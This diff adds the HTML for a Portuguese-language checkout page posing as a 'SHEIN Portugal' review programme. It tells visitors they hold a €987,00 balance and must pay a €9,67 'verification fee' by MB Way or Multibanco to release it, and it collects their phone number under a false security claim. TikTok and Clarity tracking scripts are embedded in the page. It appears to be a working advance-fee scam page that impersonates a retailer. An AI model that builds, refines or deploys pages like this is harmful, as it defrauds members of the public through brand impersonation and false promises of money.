@@ -1,0 +1,105 @@
+<!DOCTYPE html><html lang="pt-PT"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Checkout - Programa de Avaliação SHEIN Portugal</title>
+  <link rel="icon" href="images/favicon.jpg" type="image/jpeg">
+  <link rel="stylesheet" href="css/checkout.css">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <!-- TikTok Pixel (mesmo ID que index.html) -->
+  <script async="" src="https://www.clarity.ms/tag/vierbglcsp"></script><script type="text/javascript" async="" src="js/events.js"></script><script>
+    !function (w, d, t) {
+      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var s=document.createElement("script");s.type="text/javascript",s.async=!0,s.src=r+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(s,a)};
+      ttq.load('D7PL1V3C77U9KU0AHCHG');
+      ttq.page();
+    }(window, document, 'ttq');
+  </script>
+  <!-- Microsoft Clarity -->
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "vierbglcsp");
+  </script>
+<script defer="" src="js/~flock.js" data-proxy-url="/~api/analytics"></script><meta property="og:image" content="images/id-preview-8c69cb26--329b57f3-ff2f-4b8f-a38b-0437c9cc6e73.lovable.app-1773459438715.png"><meta name="twitter:image" content="https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/f8c38583-5073-4d3c-bf8d-4222b770f7f6/id-preview-8c69cb26--329b57f3-ff2f-4b8f-a38b-0437c9cc6e73.lovable.app-1773459438715.png"></head>
+<body>
+  <div class="checkout-page">
+    <div class="checkout-content">
+      <div class="checkout-header">
+        <a href="#" class="back-btn" onclick="window.history.back(); return false;">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"></path></svg>
+        </a>
+        <h1>Confirmar Levantamento</h1>
+      </div>
+      
+      <div class="checkout-summary">
+        <div class="summary-item">
+          <span>Saldo disponível:</span>
+          <strong>€987,00</strong>
+        </div>
+        <div class="summary-item">
+          <span>Taxa de verificação:</span>
+          <strong>€9,67</strong>
+        </div>
+        <div class="summary-item total">
+          <span>Total a pagar:</span>
+          <strong>€9,67</strong>
+        </div>
+      </div>
+      
+      <form class="checkout-form" id="checkout-form">
+        <div class="form-section">
+          <h3>Método de Pagamento</h3>
+          
+          <div class="payment-method-options">
+            <label class="payment-method-option">
+              <input type="radio" name="payment-method" value="mbway" checked="">
+              <div class="method-card">
+                <img src="images/mbway-logo.png" alt="MB Way" class="method-logo-small">
+                <span>MB Way</span>
+              </div>
+            </label>
+            
+            <label class="payment-method-option">
+              <input type="radio" name="payment-method" value="multibanco">
+              <div class="method-card">
+                <img src="images/multibanco-logo.png" alt="Multibanco" class="method-logo-small">
+                <span>Multibanco</span>
+              </div>
+            </label>
+          </div>
+        </div>
+        
+        <div class="form-section" id="phone-section" style="display: block;">
+          <h3>Telefone MB Way</h3>
+          
+          <div class="form-group">
+            <label for="payer-phone">Número de Telemóvel</label>
+            <div class="phone-input-wrapper">
+              <div class="country-code">
+                <span class="flag">🇵🇹</span>
+                <span class="code">+351</span>
+              </div>
+              <input type="tel" id="payer-phone" name="phone" placeholder="912345678" maxlength="9" pattern="[0-9]*" inputmode="numeric" autocomplete="off" value="" required="">
+            </div>
+          </div>
+        </div>
+        
+        <div id="mbway-submit-section">
+          <button type="submit" class="checkout-submit-btn" id="checkout-submit-btn">
+            Pagar €9,67
+          </button>
+        </div>
+        
+        <div class="checkout-info">
+          <p>🔒 O teu pagamento é seguro e protegido</p>
+          <p>💰 Taxa de verificação para libertar os €987,00 do teu saldo</p>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <script src="js/checkout.js"></script>
+
+
+</body></html>
